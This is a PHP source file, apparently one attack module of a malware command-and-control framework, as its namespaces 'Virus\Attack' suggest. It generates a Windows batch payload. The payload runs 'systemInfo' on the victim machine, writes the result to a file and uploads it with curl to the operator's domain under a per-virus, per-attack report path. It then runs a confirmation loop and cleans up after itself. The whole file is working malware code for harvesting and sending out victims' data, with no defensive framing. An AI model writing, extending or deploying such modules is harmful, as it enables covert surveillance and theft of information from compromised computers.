<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

class SystemInfo extends AttackBase {
    public string $systemInfo = "";

    public function getSystemInfo(): string {
        return $this->systemInfo;
    }

    public function setSystemInfo(string $systemInfo) {
        $this->systemInfo = $systemInfo;
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->systemInfo = $state["systemInfo"];
    }

    protected function getState(): string {
        $state = [];
        $state["systemInfo"] = $this->systemInfo;
        return json_encode($state);
    }

    private function generateUploadCode() {
        ob_start(); ?>
        curl --form "systemFile=@%~pd0system;filename=system" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function generateBatchCode(): string {
        ob_start(); //@formatter:off ?>
        chCp 65001
        systemInfo > %~pd0system
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); //@formatter:on
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
    }
}
